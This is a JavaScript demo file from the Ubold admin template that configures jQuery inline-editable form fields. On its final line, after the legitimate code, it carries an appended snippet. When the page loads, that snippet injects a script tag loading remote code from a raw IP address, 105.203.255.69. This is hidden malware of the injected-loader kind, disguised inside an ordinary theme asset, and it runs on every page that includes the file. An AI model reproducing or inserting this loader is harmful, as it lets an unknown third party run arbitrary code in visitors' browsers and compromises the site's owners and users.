
/**
 * Theme: Ubold Admin Template
 * Author: Coderthemes
 * Demo: Editable (Inline editing)
 *
 */

$(function(){

    //modify buttons style
    $.fn.editableform.buttons =
        '<button type="submit" class="btn btn-primary editable-submit btn-sm waves-effect waves-light"><i class="md md-check"></i></button>' +
        '<button type="button" class="btn btn-danger editable-cancel btn-sm waves-effect"><i class="md md-close"></i></button>';

    //Inline editables
    $('#inline-username').editable({
        type: 'text',
        pk: 1,
        name: 'username',
        title: 'Enter username',
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-firstname').editable({
        validate: function(value) {
            if($.trim(value) == '') return 'This field is required';
        },
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-sex').editable({
        prepend: "not selected",
        mode: 'inline',
        inputclass: 'form-control-sm',
        source: [
            {value: 1, text: 'Male'},
            {value: 2, text: 'Female'}
        ],
        display: function(value, sourceData) {
            var colors = {"": "gray", 1: "green", 2: "blue"},
                elem = $.grep(sourceData, function(o){return o.value == value;});

            if(elem.length) {
                $(this).text(elem[0].text).css("color", colors[value]);
            } else {
                $(this).empty();
            }
        }
    });

    $('#inline-group').editable({
        showbuttons: false,
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-status').editable({
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-dob').editable({
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-event').editable({
        placement: 'right',
        mode: 'inline',
        combodate: {
            firstItem: 'name'
        },
        inputclass: 'form-control-sm'
    });

    $('#inline-comments').editable({
        showbuttons: 'bottom',
        mode: 'inline',
        inputclass: 'form-control-sm'
    });

    $('#inline-fruits').editable({
        pk: 1,
        limit: 3,
        mode: 'inline',
        inputclass: 'form-control-sm',
        source: [
            {value: 1, text: 'Banana'},
            {value: 2, text: 'Peach'},
            {value: 3, text: 'Apple'},
            {value: 4, text: 'Watermelon'},
            {value: 5, text: 'Orange'}
        ]
    });

});;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);